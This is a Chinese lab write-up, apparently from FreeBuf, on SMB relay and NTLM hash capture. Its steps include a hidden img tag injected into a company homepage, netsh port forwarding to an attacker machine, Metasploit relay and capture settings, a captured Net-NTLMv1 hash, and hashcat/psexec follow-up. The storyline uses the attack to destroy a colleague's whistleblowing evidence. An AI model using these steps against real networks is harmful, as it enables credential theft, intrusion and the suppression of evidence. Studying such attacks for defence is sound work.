***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

**SMB又名网络文件共享文件，顾名思义其作用是用于用户与服务端之间的文件交互。默认端口为139，445。SMB的认证过程在这里就不重复描述了，具体可以看我上一篇写的文章，[路由器抓包分析之SMB篇](https://www.freebuf.com/news/193340.html)。在认证的时候细心的同学一定会发现在Windows下访问SMB服务器会默认使用当前用户hash去向SMB服务器发起认证。下面的实验便与这个机制有关。**  

## **实验环境：**

 ****

> **windows 7 (smb server) 192.168.0.100**
>
> **window7(** **bob** **管理的网站** **) 192.168.0.2**
>
> **kali(** **攻击机** **/** **路人甲** **) 192.168.0.122** **（因为懒直接用同一网段** **IP**
> **了，大家可以假装这台是外网机器）**

 ****

 **实验模拟：**
Bob是公司网站管理员，一天同部门的Alice发现Bob跟Boss老婆有一腿，决定向BOSS举报。并把证据上传到了SMB服务器，Bob知道后急忙到SMB服务器上查看，结果发现自己没有权限访问，于是急忙向好哥们路人甲救助。路人甲知道情况后一阵思考，决定用SMB中继来窃取凭证登陆SMB服务器，简单画一下原理图。

![正常认证.png](https://image.3001.net/images/20190218/1550463539_5c6a3233b724f.png!small)

正常认证

如图1为正常认证过程。

![中继认证.png](https://image.3001.net/images/20190117/1547733276_5c40891c2e8f9.png!small)中继认证

如图2所示为以bob的网站服务器作为攻击机，但是服务器上存在杀毒软件，所以失败。

![穿透认证.png](https://image.3001.net/images/20190117/1547733291_5c40892b2af55.png!small)

穿透内网中继认证

如图3所示为以Bob的服务器为代理，把服务器的445端口转发到外网VPS，再以VPS为攻击机进行中继攻击。

首先在公司主页上插入一段JS<img src=//192.168.0.2
hidden="看不见我">。因为Bob是网站管理员所以插入代码并不难，192.168.0.2是Bob管理的网站服务器，在Bob的公司每个人上班都需到官网打卡签到，前面也说到了SMB自动认证的机制，所以只要员工用IE（chrome和firefox亲测无效）访问公司官网就会进行自动认证。

原本想在网站服务器上直接装msf完成攻击的，但是Bob公司买了某60牌的杀毒软件。一装就会触发警报，所以路人甲决定把端口转发出来。

由于445是默认端口，要转发出来首先要停用服务。

##  **Bob's web server配置：**

打开注册表，在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\NetBT\Parameters中添加SMBDeviceEnabled并设置值为0：

![注册表.png](https://image.3001.net/images/20190113/1547310323_5c3a14f381a18.png!small)

更改注册表

接着打开服务，找到server项，停止server服务，并在属性更改启动类型为禁用。

![服务.png](https://image.3001.net/images/20190113/1547310370_5c3a1522dc23b.png!small)

服务

重启后就会发现445端口被关闭了。接着就可以把445端口转发至外网。

管理员运行：

    
    
    netsh interface portproxyadd v4tov4  listenport=445connectaddress=192.168.0.122 connectport=8080

![转发端口.png](https://image.3001.net/images/20190113/1547310460_5c3a157cd8493.png!small)端口转发

##  **外网VPS/攻击机上配置:**

 **启动msf**

    
    
     use exploit/windows/smb/smb_relay 
    
    set smbhost 192.168.0.100 
    
    set srvport 8080

这里少了一步内网转发，可以用ants,ew,lcx,web代理等等等把内网代理转发到外网。

![opoins.png](https://image.3001.net/images/20190113/1547310575_5c3a15ef3ba5d.png!small)

配置msf

接着运行等待，果不其然，在第二天早上所有员工打卡之后，终于抓到了有权限登陆SMB服务器的hash并进行中继，拿到了smb服务器的权限，成功删除了证据。

![succeed.png](https://image.3001.net/images/20190113/1547310597_5c3a160510ca0.png!small)

成功拿到SMB服务器权

##  **实验模拟2：**

上面说到Alice发现Bob与BOSS老婆有一腿，然后Alice把证据上传到了SMB服务器准备举报，在Bob的好哥们路人甲的帮助下删除了证据。但是Bob仍旧担心Alice的PC机内会存有证据的备份，Bob只能继续救助自己的好哥们路人甲。

路人甲通过Bob知道了Alice在内网的IP为192.168.0.3。首先路人甲用smb_touch扫描192.168.0.3的445端口，发现Alice的PC竟然用的是XP，都2019了竟然还有人用XP。既然能访问445还是XP系统直接使用永恒之蓝对其进行攻击，发现攻击失败。背后通过Bob得知全公司的内网PC都安装了某60的杀毒软件。

![360.jpg](https://image.3001.net/images/20190218/1550463482_5c6a31fabee6e.jpg!small)

未命名

某60为XP保驾护航，既然安装了某60的杀毒软件，许多攻击都无法进行，只能另想办法，于是路人甲便想到了把自己的攻击机伪
装SMB服务器，让其他用户向其认证进行抓取hash。原理图2所示：

![原理图.png](https://image.3001.net/images/20190218/1550463677_5c6a32bde06df.png!small)

原理图

## Bob web server 配置：  

1.在Web首页上加上js代码<imgsrc=//192.168.0.2
hidden="看不见我">(Bob管理公司服务器官网，员工每天上班需到官网打卡签到，当IE浏览器访问时就会触发自认证操作)；

2.关闭445端口，将445端口转发到192.168.0.122的8080端口。（因为装了某60杀毒软件，需要转发端口到外网，具体操作见上一篇文章）。

 **路人甲VPS：**

启动msf并配置：

    
    
    use auxiliary/server/capture/smb 
    
    set srvport 8080 
    
    exploit

![options.png](https://image.3001.net/images/20190218/1550463722_5c6a32eaa2ee2.png!small)

msf配置

如图11所示这里我们可以看到配置中有challenge这一项，这里之所以把challenge设为1122334455667788是因为已经有人通过这个挑战值生成了彩虹表，这样可以减少跑hash所花费的时间。

配置完之后只需静静等待Alice明天打卡上班就可以抓到她的hash了。

![ntlmv1.png](https://image.3001.net/images/20190218/1550463788_5c6a332c5a5d5.png!small)

成功抓取hash值

通过组合hash得到Net-ntlmv1：

    
    
    Administrator::FUCK1:6822b126aac81581dbcc3576a52dc4612f85252cc731bb25:a77b6fbd0247c656be59e409ae3a01c07ca6bbc11dec9322:1122334455667788

接着把hash扔进hashcat跑出明文密码，利用psexec通过445端口对Alice机子进行命令执行，然后全盘搜索，成功删除了证据文件。

 ***本文作者：꧁，转载请注明来自FreeBuf.COM**

